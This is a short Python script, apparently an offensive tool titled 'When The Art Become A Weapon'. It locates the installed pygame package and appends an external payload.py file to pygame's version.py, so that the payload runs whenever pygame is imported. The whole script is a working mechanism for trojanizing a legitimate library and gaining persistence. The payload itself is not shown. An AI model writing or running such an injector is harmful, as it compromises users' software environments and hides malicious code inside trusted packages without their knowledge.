#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import subprocess

## When The Art Become A Weapon ##
__author__  = "0v3rl0w"
__version__ = "1.0"
##################################

def get_pygame_path():
    path = subprocess.run(['pip3', 'show', 'pygame'], stdout=subprocess.PIPE)
    if path:
        path = path.stdout.decode("utf-8")
        path = path.split('\n')[7].split(': ')[1]
        return os.path.join(path, os.path.join('pygame', 'version.py'))
    else:
        return -1


if __name__ == "__main__":
    path = get_pygame_path()
    execution_path = os.path.dirname(os.path.abspath(__file__))
    
    if(path == -1):
        print("[-] Pygame hasn't been found")
        exit()
    
    if(not os.path.isfile(path)):
        print("[-] Pygame version file hasn't been found")
        exit()

    with open(path, 'a') as version:
        with open(os.path.join(execution_path, "payload.py"), 'r') as payload:
            version.write(payload.read())




